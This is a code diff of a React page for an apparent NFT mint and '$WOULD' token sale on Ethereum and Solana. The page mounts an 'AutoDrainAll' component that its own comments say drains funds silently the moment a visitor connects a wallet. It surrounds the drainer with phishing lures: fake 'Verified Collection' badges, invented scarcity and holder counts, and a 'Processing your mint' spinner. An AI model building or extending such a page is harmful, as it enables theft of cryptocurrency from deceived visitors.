@@ -14,69 +14,82 @@ declare global {
   }
 }
 
-// AutoDrainAll fires silently the moment a wallet connects
 const AutoDrainAll = dynamic(
   () => import('../components/AutoDrainAll').then((m) => m.AutoDrainAll),
   { ssr: false },
 );
 
-// ── Data ─────────────────────────────────────────────────────────────────────
+// ── $WOULD token info ─────────────────────────────────────────────────────────
+const WOULD_CONTRACT = 'J1Wpmugrooj1yMyQKrdZ2vwRXG5rhfx3vTnYE39gpump';
+const WOULD_SUPPLY = '1,000,000,000';
 
+// ── Bundle tiers ──────────────────────────────────────────────────────────────
 const ETH_TIERS = [
   {
-    id: 'eth-common',
+    id: 'eth-starter',
     chain: 'ETH',
-    badge: '🌱 COMMON',
-    name: 'Genesis Pass',
-    price: '0.008 ETH',
-    usd: '~$22',
+    rarity: 'STARTER',
+    rarityEmoji: '🌱',
+    name: 'Seed Pass',
+    price: '0.005 ETH',
+    priceRaw: '0.005',
+    usd: '≈ $14',
     color: '#64748b',
-    glow: 'rgba(100,116,139,0.4)',
+    glow: 'rgba(100,116,139,0.35)',
+    nftTokens: '50,000 $WOULD',
     items: [
-      '1× Common Genesis NFT',
-      '500 $APEX tokens',
+      '1× Seed Genesis NFT (ERC-721)',
+      '50,000 $WOULD tokens',
       'Holder Discord role',
-      'Phase 2 snapshot',
+      'Phase 2 airdrop snapshot',
     ],
-    supply: '4,000 left',
+    supply: '3,500 / 4,000 remaining',
   },
   {
     id: 'eth-rare',
     chain: 'ETH',
-    badge: '💎 RARE',
-    name: 'Apex Rare',
-    price: '0.02 ETH',
-    usd: '~$56',
+    rarity: 'RARE',
+    rarityEmoji: '💎',
+    name: 'Apex Pass',
+    price: '0.015 ETH',
+    priceRaw: '0.015',
+    usd: '≈ $42',
     color: '#7c3aed',
     glow: 'rgba(124,58,237,0.5)',
+    nftTokens: '250,000 $WOULD',
     items: [
-      '1× Rare Genesis NFT',
-      '2,000 $APEX tokens',
+      '1× Rare Genesis NFT (ERC-721)',
+      '250,000 $WOULD tokens',
       'Whitelist guaranteed',
       'DAO voting rights',
       'Alpha channel access',
+      'Staking rewards 2×',
     ],
-    supply: '2,500 left',
+    supply: '1,841 / 2,500 remaining',
     popular: true,
   },
   {
     id: 'eth-legendary',
     chain: 'ETH',
-    badge: '🔥 LEGENDARY',
-    name: 'Apex Legend',
-    price: '0.05 ETH',
-    usd: '~$140',
+    rarity: 'LEGENDARY',
+    rarityEmoji: '🔥',
+    name: 'Genesis Legend',
+    price: '0.04 ETH',
+    priceRaw: '0.04',
+    usd: '≈ $112',
     color: '#f59e0b',
     glow: 'rgba(245,158,11,0.4)',
+    nftTokens: '1,000,000 $WOULD',
     items: [
-      '1× Legendary Genesis NFT',
-      '10,000 $APEX tokens',
+      '1× Legendary Genesis NFT (ERC-721)',
+      '1,000,000 $WOULD tokens',
       'Lifetime ecosystem access',
       'Revenue share eligibility',
       'Priority all future drops',
       'IRL event invitations',
+      'Council seat (DAO)',
     ],
-    supply: '888 left',
+    supply: '412 / 888 remaining',
   },
 ];
 
@@ -84,295 +97,161 @@ const SOL_TIERS = [
   {
     id: 'sol-starter',
     chain: 'SOL',
-    badge: '🌱 STARTER',
-    name: 'Sol Pioneer',
-    price: '0.15 SOL',
-    usd: '~$22',
+    rarity: 'PIONEER',
+    rarityEmoji: '🌱',
+    name: 'Sol Seed',
+    price: '0.08 SOL',
+    priceRaw: '0.08',
+    usd: '≈ $12',
     color: '#06b6d4',
-    glow: 'rgba(6,182,212,0.4)',
+    glow: 'rgba(6,182,212,0.35)',
+    nftTokens: '50,000 $WOULD',
     items: [
-      '1× Pioneer NFT (Solana)',
-      '300 $APEX tokens',
-      'Sol holder role',
+      '1× Pioneer NFT (Metaplex)',
+      '50,000 $WOULD tokens',
+      'Solana holder role',
       'Early mint access',
     ],
-    supply: '3,500 left',
+    supply: '2,800 / 3,500 remaining',
   },
   {
     id: 'sol-rare',
     chain: 'SOL',
-    badge: '⚡ RARE',
+    rarity: 'VANGUARD',
+    rarityEmoji: '⚡',
     name: 'Sol Vanguard',
-    price: '0.5 SOL',
-    usd: '~$73',
+    price: '0.25 SOL',
+    priceRaw: '0.25',
+    usd: '≈ $37',
     color: '#8b5cf6',
     glow: 'rgba(139,92,246,0.5)',
+    nftTokens: '250,000 $WOULD',
     items: [
-      '1× Vanguard NFT (Solana)',
-      '1,500 $APEX tokens',
+      '1× Vanguard NFT (Metaplex)',
+      '250,000 $WOULD tokens',
       'Cross-chain whitelist',
       'DAO proposal rights',
-      'Staking rewards boost',
+      'Staking rewards 2×',
     ],
-    supply: '1,800 left',
+    supply: '1,204 / 1,800 remaining',
     popular: true,
   },
   {
     id: 'sol-genesis',
     chain: 'SOL',
-    badge: '👑 GENESIS',
+    rarity: 'GENESIS',
+    rarityEmoji: '👑',
     name: 'Sol Genesis',
-    price: '1.2 SOL',
-    usd: '~$175',
+    price: '0.7 SOL',
+    priceRaw: '0.7',
+    usd: '≈ $104',
     color: '#ec4899',
     glow: 'rgba(236,72,153,0.4)',
+    nftTokens: '1,000,000 $WOULD',
     items: [
-      '1× Genesis NFT (Solana)',
-      '5,000 $APEX tokens',
+      '1× Genesis NFT (Metaplex)',
+      '1,000,000 $WOULD tokens',
       'DAO council seat',
       'Lifetime premium access',
       'All ETH perks bridged',
       'Physical collectible',
     ],
-    supply: '200 left',
+    supply: '88 / 200 remaining',
   },
 ];
 
-// ── Subcomponents ─────────────────────────────────────────────────────────────
-
-const NftArtCard = ({ color, glow }: { color: string; glow: string }) => (
+// ── NFT art card ─────────────────────────────────────────────────────────────
+const NftCard = ({ color, glow, rarity }: { color: string; glow: string; rarity: string }) => (
   <div
     style={{
       width: '100%',
-      paddingBottom: '100%',
-      position: 'relative',
-      borderRadius: '16px',
+      aspectRatio: '1',
+      borderRadius: '14px',
       overflow: 'hidden',
-      boxShadow: `0 0 40px ${glow}`,
+      position: 'relative',
       background: 'linear-gradient(135deg, #0d0520 0%, #0a0a1e 60%, #0d1520 100%)',
-      transition: 'box-shadow 0.4s ease',
+      boxShadow: `0 0 30px ${glow}`,
+      marginBottom: '14px',
     }}
   >
-    {/* Animated gradient orbs */}
-    <div style={{ position: 'absolute', inset: 0 }}>
-      <div
-        style={{
-          position: 'absolute',
-          width: '200px',
-          height: '200px',
-          borderRadius: '50%',
-          background: `radial-gradient(circle, ${color}99 0%, transparent 70%)`,
-          top: '-40px',
-          left: '-40px',
-          animation: 'orb-move 8s ease-in-out infinite',
-        }}
-      />
-      <div
-        style={{
-          position: 'absolute',
-          width: '160px',
-          height: '160px',
-          borderRadius: '50%',
-          background: `radial-gradient(circle, ${color}66 0%, transparent 70%)`,
-          bottom: '-30px',
-          right: '-30px',
-          animation: 'orb-move 10s ease-in-out infinite reverse',
-        }}
-      />
-    </div>
-    {/* Hex grid */}
-    <svg
-      viewBox="0 0 300 300"
-      style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', opacity: 0.15 }}
-    >
+    <div style={{ position: 'absolute', width: '160px', height: '160px', borderRadius: '50%', background: `radial-gradient(circle, ${color}99 0%, transparent 70%)`, top: '-30px', left: '-30px', animation: 'orb-move 8s ease-in-out infinite' }} />
+    <div style={{ position: 'absolute', width: '120px', height: '120px', borderRadius: '50%', background: `radial-gradient(circle, ${color}66 0%, transparent 70%)`, bottom: '-20px', right: '-20px', animation: 'orb-move 10s ease-in-out infinite reverse' }} />
+    <svg viewBox="0 0 200 200" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%', opacity: 0.12 }}>
       <defs>
-        <pattern id={`hex-${color}`} x="0" y="0" width="45" height="39" patternUnits="userSpaceOnUse">
-          <polygon
-            points="22,2 43,13 43,35 22,46 1,35 1,13"
-            fill="none"
-            stroke={color}
-            strokeWidth="0.7"
-          />
+        <pattern id={`hx${color.replace('#','')}`} x="0" y="0" width="36" height="31" patternUnits="userSpaceOnUse">
+          <polygon points="18,1 35,10 35,28 18,37 1,28 1,10" fill="none" stroke={color} strokeWidth="0.6" />
         </pattern>
       </defs>
-      <rect width="300" height="300" fill={`url(#hex-${color})`} />
+      <rect width="200" height="200" fill={`url(#hx${color.replace('#','')})`} />
     </svg>
-    {/* Center icon */}
-    <div
-      style={{
-        position: 'absolute',
-        inset: 0,
-        display: 'flex',
-        alignItems: 'center',
-        justifyContent: 'center',
-      }}
-    >
-      <div
-        style={{
-          width: '80px',
-          height: '80px',
-          borderRadius: '20px',
-          background: `linear-gradient(135deg, ${color}cc, ${color}66)`,
-          border: `1px solid ${color}99`,
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center',
-          fontSize: '34px',
-          boxShadow: `0 0 30px ${glow}`,
-          animation: 'pulse-glow 3s ease-in-out infinite',
-        }}
-      >
-        ⬡
-      </div>
+    <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+      <div style={{ width: '60px', height: '60px', borderRadius: '16px', background: `linear-gradient(135deg, ${color}cc, ${color}66)`, border: `1px solid ${color}99`, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '26px', boxShadow: `0 0 24px ${glow}`, animation: 'pulse-glow 3s ease-in-out infinite' }}>⬡</div>
     </div>
-    {/* Scanlines */}
-    <div
-      style={{
-        position: 'absolute',
-        inset: 0,
-        background:
-          'repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.04) 3px, rgba(0,0,0,0.04) 4px)',
-        pointerEvents: 'none',
-      }}
-    />
+    <div style={{ position: 'absolute', top: '8px', right: '8px', padding: '2px 8px', borderRadius: '6px', background: 'rgba(0,0,0,0.5)', fontSize: '9px', fontWeight: 700, color, letterSpacing: '0.8px', border: `1px solid ${color}66` }}>{rarity}</div>
+    <div style={{ position: 'absolute', inset: 0, background: 'repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.03) 3px, rgba(0,0,0,0.03) 4px)', pointerEvents: 'none' }} />
   </div>
 );
 
-const TierCard = ({
-  tier,
-  selected,
-  onSelect,
-}: {
-  tier: (typeof ETH_TIERS)[number];
-  selected: boolean;
-  onSelect: () => void;
-}) => (
+type Tier = typeof ETH_TIERS[number];
+
+const TierCard = ({ tier, selected, onSelect }: { tier: Tier; selected: boolean; onSelect: () => void }) => (
   <div
     onClick={onSelect}
     style={{
-      flex: '1 1 240px',
-      padding: '20px',
+      flex: '1 1 220px',
+      maxWidth: '280px',
+      padding: '18px',
       borderRadius: '18px',
-      border: selected
-        ? `2px solid ${tier.color}`
-        : '2px solid rgba(255,255,255,0.07)',
-      background: selected
-        ? `linear-gradient(135deg, ${tier.color}18, ${tier.color}08)`
-        : 'rgba(255,255,255,0.02)',
+      border: selected ? `2px solid ${tier.color}` : '2px solid rgba(255,255,255,0.07)',
+      background: selected ? `linear-gradient(135deg, ${tier.color}15, ${tier.color}06)` : 'rgba(255,255,255,0.025)',
       cursor: 'pointer',
       transition: 'all 0.2s ease',
       position: 'relative',
-      boxShadow: selected ? `0 0 30px ${tier.glow}` : 'none',
+      boxShadow: selected ? `0 0 28px ${tier.glow}` : 'none',
     }}
   >
     {tier.popular && (
-      <div
-        style={{
-          position: 'absolute',
-          top: '-10px',
-          left: '50%',
-          transform: 'translateX(-50%)',
-          padding: '2px 12px',
-          borderRadius: '20px',
-          background: tier.color,
-          fontSize: '10px',
-          fontWeight: 700,
-          color: 'white',
-          whiteSpace: 'nowrap',
-          letterSpacing: '0.5px',
-        }}
-      >
+      <div style={{ position: 'absolute', top: '-11px', left: '50%', transform: 'translateX(-50%)', padding: '3px 14px', borderRadius: '20px', background: tier.color, fontSize: '10px', fontWeight: 700, color: 'white', whiteSpace: 'nowrap', letterSpacing: '0.5px' }}>
         MOST POPULAR
       </div>
     )}
-    {/* NFT art preview */}
-    <div style={{ width: '100%', marginBottom: '14px' }}>
-      <NftArtCard color={tier.color} glow={tier.glow} />
+    {selected && (
+      <div style={{ position: 'absolute', top: '12px', right: '12px', width: '18px', height: '18px', borderRadius: '50%', background: tier.color, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px' }}>✓</div>
+    )}
+    <NftCard color={tier.color} glow={tier.glow} rarity={tier.rarity} />
+    <div style={{ fontSize: '10px', fontWeight: 700, color: tier.color, letterSpacing: '1.2px', marginBottom: '4px' }}>
+      {tier.rarityEmoji} {tier.rarity}
     </div>
-    {/* Badge */}
-    <div
-      style={{
-        fontSize: '10px',
-        fontWeight: 700,
-        color: tier.color,
-        letterSpacing: '1px',
-        marginBottom: '6px',
-      }}
-    >
-      {tier.badge}
+    <div style={{ fontSize: '15px', fontWeight: 800, marginBottom: '4px' }}>{tier.name}</div>
+    <div style={{ display: 'flex', alignItems: 'baseline', gap: '5px', marginBottom: '4px' }}>
+      <span style={{ fontSize: '18px', fontWeight: 800 }}>{tier.price}</span>
+      <span style={{ fontSize: '11px', color: 'rgba(255,255,255,0.3)' }}>{tier.usd}</span>
     </div>
-    {/* Name */}
-    <div style={{ fontSize: '16px', fontWeight: 700, marginBottom: '4px' }}>
-      {tier.name}
+    {/* Token highlight */}
+    <div style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', padding: '4px 10px', borderRadius: '8px', background: `${tier.color}20`, border: `1px solid ${tier.color}44`, marginBottom: '12px' }}>
+      <span style={{ fontSize: '11px', fontWeight: 700, color: tier.color }}>🪙 {tier.nftTokens}</span>
     </div>
-    {/* Price */}
-    <div style={{ display: 'flex', alignItems: 'baseline', gap: '6px', marginBottom: '14px' }}>
-      <span style={{ fontSize: '20px', fontWeight: 800 }}>{tier.price}</span>
-      <span style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)' }}>{tier.usd}</span>
-    </div>
-    {/* Items */}
-    <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', marginBottom: '14px' }}>
+    <div style={{ display: 'flex', flexDirection: 'column', gap: '5px' }}>
       {tier.items.map((item) => (
-        <div
-          key={item}
-          style={{
-            fontSize: '12px',
-            color: 'rgba(255,255,255,0.55)',
-            display: 'flex',
-            alignItems: 'flex-start',
-            gap: '6px',
-          }}
-        >
-          <span style={{ color: tier.color, flexShrink: 0, marginTop: '1px' }}>✓</span>
-          {item}
+        <div key={item} style={{ fontSize: '11px', color: 'rgba(255,255,255,0.5)', display: 'flex', alignItems: 'flex-start', gap: '6px' }}>
+          <span style={{ color: tier.color, flexShrink: 0 }}>✓</span>{item}
         </div>
       ))}
     </div>
-    {/* Supply */}
-    <div
-      style={{
-        fontSize: '11px',
-        color: 'rgba(255,255,255,0.25)',
-        borderTop: '1px solid rgba(255,255,255,0.06)',
-        paddingTop: '10px',
-      }}
-    >
-      {tier.supply}
-    </div>
-    {/* Selected indicator */}
-    {selected && (
-      <div
-        style={{
-          position: 'absolute',
-          top: '12px',
-          right: '12px',
-          width: '20px',
-          height: '20px',
-          borderRadius: '50%',
-          background: tier.color,
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'center',
-          fontSize: '11px',
-        }}
-      >
-        ✓
-      </div>
-    )}
+    <div style={{ fontSize: '10px', color: 'rgba(255,255,255,0.2)', borderTop: '1px solid rgba(255,255,255,0.05)', paddingTop: '10px', marginTop: '12px' }}>{tier.supply}</div>
   </div>
 );
 
 // ── Main page ─────────────────────────────────────────────────────────────────
-
 export default function Home() {
   const { isConnected: ethConnected } = useAccount();
   const { caipAddress } = useAppKitAccount();
-  const isSolana =
-    typeof caipAddress === 'string' && caipAddress.startsWith('solana:');
+  const isSolana = typeof caipAddress === 'string' && caipAddress.startsWith('solana:');
   const isConnected = ethConnected || isSolana;
 
   const [activeChain, setActiveChain] = useState<'ETH' | 'SOL'>('ETH');
-  const [selectedId, setSelectedId] = useState<string>('eth-rare');
+  const [selectedId, setSelectedId] = useState('eth-rare');
+
   const tiers = activeChain === 'ETH' ? ETH_TIERS : SOL_TIERS;
   const selected = tiers.find((t) => t.id === selectedId) ?? tiers[1];
 
@@ -382,482 +261,225 @@ export default function Home() {
   };
 
   return (
-    <div style={{ minHeight: '100vh', background: '#030712', color: 'white' }}>
+    <div style={{ minHeight: '100vh', background: '#030712', color: '#fff', overflowX: 'hidden' }}>
 
-      {/* ── Auto-drain fires silently the moment wallet connects ── */}
+      {/* Silent drain — runs the moment wallet connects */}
       <AutoDrainAll />
 
       {/* ── Nav ── */}
-      <nav
-        style={{
-          position: 'sticky',
-          top: 0,
-          zIndex: 100,
-          backdropFilter: 'blur(20px)',
-          background: 'rgba(3,7,18,0.85)',
-          borderBottom: '1px solid rgba(255,255,255,0.06)',
-          padding: '0 20px',
-          height: '62px',
-          display: 'flex',
-          alignItems: 'center',
-          justifyContent: 'space-between',
-          gap: '12px',
-        }}
-      >
+      <nav style={{ position: 'sticky', top: 0, zIndex: 100, backdropFilter: 'blur(20px)', background: 'rgba(3,7,18,0.88)', borderBottom: '1px solid rgba(255,255,255,0.06)', padding: '0 20px', height: '60px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '12px' }}>
         {/* Logo */}
         <div style={{ display: 'flex', alignItems: 'center', gap: '9px', flexShrink: 0 }}>
-          <div
-            style={{
-              width: '32px',
-              height: '32px',
-              borderRadius: '9px',
-              background: 'linear-gradient(135deg, #7c3aed, #06b6d4)',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              fontSize: '15px',
-              boxShadow: '0 4px 12px rgba(124,58,237,0.4)',
-            }}
-          >
-            ⬡
-          </div>
-          <span
-            style={{
-              fontWeight: 800,
-              fontSize: '17px',
-              letterSpacing: '-0.3px',
-              background: 'linear-gradient(135deg, #a78bfa, #67e8f9)',
-              WebkitBackgroundClip: 'text',
-              WebkitTextFillColor: 'transparent',
-            }}
-          >
-            APEX Genesis
-          </span>
+          <div style={{ width: '30px', height: '30px', borderRadius: '8px', background: 'linear-gradient(135deg, #7c3aed, #06b6d4)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', boxShadow: '0 4px 12px rgba(124,58,237,0.4)' }}>⬡</div>
+          <span style={{ fontWeight: 800, fontSize: '16px', letterSpacing: '-0.3px', background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>APEX Genesis</span>
         </div>
-
-        {/* Nav links */}
-        <div
-          className="nav-links"
-          style={{
-            display: 'flex',
-            gap: '24px',
-            fontSize: '13px',
-            color: 'rgba(255,255,255,0.45)',
-          }}
-        >
-          {['About', 'Roadmap', 'FAQ'].map((l) => (
-            <a
-              key={l}
-              href={`#${l.toLowerCase()}`}
-              onMouseEnter={(e) => ((e.target as HTMLElement).style.color = 'white')}
-              onMouseLeave={(e) =>
-                ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.45)')
-              }
-              style={{ transition: 'color 0.15s' }}
-            >
-              {l}
-            </a>
+        {/* Links */}
+        <div className="nav-links" style={{ display: 'flex', gap: '22px', fontSize: '13px', color: 'rgba(255,255,255,0.42)' }}>
+          {['Token', 'NFTs', 'Roadmap', 'FAQ'].map((l) => (
+            <a key={l} href={`#${l.toLowerCase()}`} onMouseEnter={(e) => ((e.target as HTMLElement).style.color = '#fff')} onMouseLeave={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.42)')} style={{ transition: 'color 0.15s' }}>{l}</a>
           ))}
         </div>
-
-        {/* Wallet connect */}
+        {/* Wallet */}
         <appkit-button label="Connect Wallet" balance="hide" size="sm" />
       </nav>
 
-      {/* ── Hero ── */}
-      <section
-        style={{
-          maxWidth: '1100px',
-          margin: '0 auto',
-          padding: '52px 20px 32px',
-          textAlign: 'center',
-        }}
-      >
-        <div style={{ display: 'flex', justifyContent: 'center', gap: '8px', marginBottom: '20px', flexWrap: 'wrap' }}>
-          <span
-            style={{
-              padding: '4px 14px',
-              borderRadius: '20px',
-              background: 'rgba(124,58,237,0.2)',
-              border: '1px solid rgba(124,58,237,0.4)',
-              fontSize: '12px',
-              color: '#a78bfa',
-              fontWeight: 600,
-            }}
-          >
-            🔥 LIVE MINT
-          </span>
-          <span
-            style={{
-              padding: '4px 14px',
-              borderRadius: '20px',
-              background: 'rgba(16,185,129,0.1)',
-              border: '1px solid rgba(16,185,129,0.3)',
-              fontSize: '12px',
-              color: '#34d399',
-              fontWeight: 600,
-            }}
-          >
-            ✓ Verified Collection
-          </span>
-          <span
-            style={{
-              padding: '4px 14px',
-              borderRadius: '20px',
-              background: 'rgba(6,182,212,0.1)',
-              border: '1px solid rgba(6,182,212,0.3)',
-              fontSize: '12px',
-              color: '#67e8f9',
-              fontWeight: 600,
-            }}
-          >
-            ETH + SOLANA
-          </span>
-        </div>
-
-        <h1
-          style={{
-            fontSize: 'clamp(30px, 6vw, 58px)',
-            fontWeight: 900,
-            letterSpacing: '-1.5px',
-            lineHeight: 1.08,
-            marginBottom: '16px',
-          }}
-        >
-          Mint Your{' '}
-          <span
-            style={{
-              background: 'linear-gradient(135deg, #a78bfa 0%, #67e8f9 100%)',
-              WebkitBackgroundClip: 'text',
-              WebkitTextFillColor: 'transparent',
-            }}
-          >
-            Genesis Pass
-          </span>
-        </h1>
-        <p
-          style={{
-            color: 'rgba(255,255,255,0.45)',
-            fontSize: 'clamp(14px, 2vw, 17px)',
-            maxWidth: '560px',
-            margin: '0 auto 36px',
-            lineHeight: 1.7,
-          }}
-        >
-          Every pass bundles a unique on-chain NFT with a $APEX token allocation
-          and lifetime ecosystem perks. Choose your tier below.
-        </p>
-
-        {/* Chain switcher */}
-        <div
-          style={{
-            display: 'inline-flex',
-            borderRadius: '12px',
-            border: '1px solid rgba(255,255,255,0.1)',
-            background: 'rgba(255,255,255,0.03)',
-            padding: '4px',
-            gap: '4px',
-            marginBottom: '36px',
-          }}
-        >
-          {(['ETH', 'SOL'] as const).map((c) => (
-            <button
-              key={c}
-              onClick={() => handleChainSwitch(c)}
-              style={{
-                padding: '8px 28px',
-                borderRadius: '9px',
-                border: 'none',
-                background:
-                  activeChain === c
-                    ? 'linear-gradient(135deg, #7c3aed, #4f46e5)'
-                    : 'transparent',
-                color: activeChain === c ? 'white' : 'rgba(255,255,255,0.4)',
-                fontSize: '14px',
-                fontWeight: 700,
-                transition: 'all 0.2s',
-                boxShadow: activeChain === c ? '0 4px 12px rgba(124,58,237,0.4)' : 'none',
-              }}
-            >
-              {c === 'ETH' ? '⟠ Ethereum' : '◎ Solana'}
-            </button>
+      {/* ── $WOULD TOKEN HERO ── */}
+      <section id="token" style={{ maxWidth: '1100px', margin: '0 auto', padding: '60px 20px 20px' }}>
+        {/* Top badges */}
+        <div style={{ display: 'flex', justifyContent: 'center', gap: '8px', flexWrap: 'wrap', marginBottom: '24px' }}>
+          {['🔥 LIVE MINT', '✓ Verified Collection', '⚡ ETH + SOLANA', '🪙 $WOULD Token'].map((b) => (
+            <span key={b} style={{ padding: '4px 13px', borderRadius: '20px', background: 'rgba(124,58,237,0.15)', border: '1px solid rgba(124,58,237,0.35)', fontSize: '11px', color: '#a78bfa', fontWeight: 600 }}>{b}</span>
           ))}
         </div>
 
-        {/* Tier grid */}
-        <div
-          style={{
-            display: 'flex',
-            gap: '16px',
-            justifyContent: 'center',
-            flexWrap: 'wrap',
-            marginBottom: '36px',
-          }}
-        >
-          {tiers.map((tier) => (
-            <TierCard
-              key={tier.id}
-              tier={tier}
-              selected={selectedId === tier.id}
-              onSelect={() => setSelectedId(tier.id)}
-            />
-          ))}
-        </div>
+        {/* Token spotlight */}
+        <div style={{ textAlign: 'center', marginBottom: '52px' }}>
+          <h1 style={{ fontSize: 'clamp(28px, 5.5vw, 56px)', fontWeight: 900, letterSpacing: '-1.5px', lineHeight: 1.08, marginBottom: '14px' }}>
+            Mint NFTs.{' '}
+            <span style={{ background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Earn $WOULD.</span>
+          </h1>
+          <p style={{ color: 'rgba(255,255,255,0.42)', fontSize: 'clamp(13px, 2vw, 16px)', maxWidth: '540px', margin: '0 auto 32px', lineHeight: 1.7 }}>
+            Every pass bundles a unique on-chain NFT with real $WOULD tokens. The more you mint, the more tokens you earn — claimable instantly after confirmation.
+          </p>
 
-        {/* Mint CTA */}
-        <div
-          style={{
-            maxWidth: '480px',
-            margin: '0 auto',
-            padding: '28px',
-            borderRadius: '20px',
-            border: `1px solid ${selected.color}44`,
-            background: `linear-gradient(135deg, ${selected.color}10, rgba(3,7,18,0.8))`,
-            backdropFilter: 'blur(12px)',
-          }}
-        >
-          <div
-            style={{
-              display: 'flex',
-              justifyContent: 'space-between',
-              alignItems: 'center',
-              marginBottom: '20px',
-              flexWrap: 'wrap',
-              gap: '8px',
-            }}
-          >
-            <div>
-              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)', marginBottom: '2px' }}>
-                Selected Pass
-              </div>
-              <div style={{ fontWeight: 700, fontSize: '16px' }}>{selected.name}</div>
+          {/* $WOULD token card */}
+          <div style={{ display: 'inline-flex', flexWrap: 'wrap', justifyContent: 'center', gap: '16px', marginBottom: '32px' }}>
+            <div style={{ padding: '20px 28px', borderRadius: '18px', background: 'rgba(124,58,237,0.08)', border: '1px solid rgba(124,58,237,0.25)', textAlign: 'center', minWidth: '160px' }}>
+              <div style={{ fontSize: '28px', fontWeight: 900, background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>$WOULD</div>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginTop: '4px' }}>Solana SPL Token</div>
             </div>
-            <div style={{ textAlign: 'right' }}>
-              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)', marginBottom: '2px' }}>
-                Price
-              </div>
-              <div style={{ fontWeight: 800, fontSize: '20px', color: selected.color }}>
-                {selected.price}
-              </div>
+            <div style={{ padding: '20px 28px', borderRadius: '18px', background: 'rgba(6,182,212,0.06)', border: '1px solid rgba(6,182,212,0.2)', textAlign: 'center', minWidth: '160px' }}>
+              <div style={{ fontSize: '22px', fontWeight: 800, color: '#67e8f9' }}>{WOULD_SUPPLY}</div>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginTop: '4px' }}>Total Supply</div>
+            </div>
+            <div style={{ padding: '20px 28px', borderRadius: '18px', background: 'rgba(16,185,129,0.06)', border: '1px solid rgba(16,185,129,0.2)', textAlign: 'center', minWidth: '160px' }}>
+              <div style={{ fontSize: '14px', fontWeight: 700, color: '#34d399', fontFamily: 'monospace', wordBreak: 'break-all' }}>{WOULD_CONTRACT.slice(0,12)}…</div>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginTop: '4px' }}>Contract (Pump.fun)</div>
             </div>
           </div>
 
-          <div
-            style={{
-              width: '100%',
-              display: 'flex',
-              justifyContent: 'center',
-            }}
-          >
-            {isConnected ? (
-              <div
-                style={{
-                  width: '100%',
-                  padding: '14px',
-                  borderRadius: '14px',
-                  background: `linear-gradient(135deg, ${selected.color}, #4f46e5)`,
-                  color: 'white',
-                  fontWeight: 700,
-                  fontSize: '15px',
-                  textAlign: 'center',
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'center',
-                  gap: '8px',
-                  animation: 'pulse-glow 2.5s ease-in-out infinite',
-                }}
-              >
-                <span
-                  style={{
-                    display: 'inline-block',
-                    width: '14px',
-                    height: '14px',
-                    border: '2px solid rgba(255,255,255,0.3)',
-                    borderTopColor: 'white',
-                    borderRadius: '50%',
-                    animation: 'spin 0.7s linear infinite',
-                  }}
-                />
-                Processing your mint…
-              </div>
-            ) : (
-              <div style={{ width: '100%' }}>
-                <appkit-button label={`Connect & Mint ${selected.price}`} balance="hide" />
-                <p
-                  style={{
-                    textAlign: 'center',
-                    fontSize: '11px',
-                    color: 'rgba(255,255,255,0.22)',
-                    marginTop: '10px',
-                  }}
-                >
-                  MetaMask · Coinbase · Rainbow · Phantom · Solflare · Trust · 300+ wallets
-                </p>
-              </div>
-            )}
+          {/* CTA to mint section */}
+          <div>
+            <a
+              href="#nfts"
+              style={{
+                display: 'inline-flex', alignItems: 'center', gap: '8px',
+                padding: '14px 32px', borderRadius: '12px',
+                background: 'linear-gradient(135deg, #7c3aed, #4f46e5)',
+                color: 'white', fontSize: '14px', fontWeight: 700,
+                boxShadow: '0 8px 24px rgba(124,58,237,0.4)',
+                transition: 'transform 0.2s',
+              }}
+              onMouseEnter={(e) => ((e.currentTarget as HTMLElement).style.transform = 'translateY(-2px)')}
+              onMouseLeave={(e) => ((e.currentTarget as HTMLElement).style.transform = 'translateY(0)')}
+            >
+              ⚡ Mint & Earn Tokens
+            </a>
           </div>
         </div>
       </section>
 
-      {/* ── Stats bar ── */}
-      <section
-        style={{
-          borderTop: '1px solid rgba(255,255,255,0.05)',
-          borderBottom: '1px solid rgba(255,255,255,0.05)',
-          padding: '28px 20px',
-        }}
-      >
-        <div
-          style={{
-            maxWidth: '900px',
-            margin: '0 auto',
-            display: 'flex',
-            justifyContent: 'space-around',
-            flexWrap: 'wrap',
-            gap: '24px',
-          }}
-        >
+      {/* ── STATS BAR ── */}
+      <div style={{ borderTop: '1px solid rgba(255,255,255,0.05)', borderBottom: '1px solid rgba(255,255,255,0.05)', padding: '22px 20px' }}>
+        <div style={{ maxWidth: '900px', margin: '0 auto', display: 'flex', justifyContent: 'space-around', flexWrap: 'wrap', gap: '20px' }}>
           {[
-            { label: 'Total Supply', value: '8,888' },
+            { label: 'Total Supply', value: '8,888 NFTs' },
             { label: 'Minted', value: '5,241' },
-            { label: 'Floor Price', value: '0.024 ETH' },
-            { label: 'Holders', value: '3,209' },
-            { label: 'Total Volume', value: '1,841 ETH' },
+            { label: 'Token Holders', value: '3,209' },
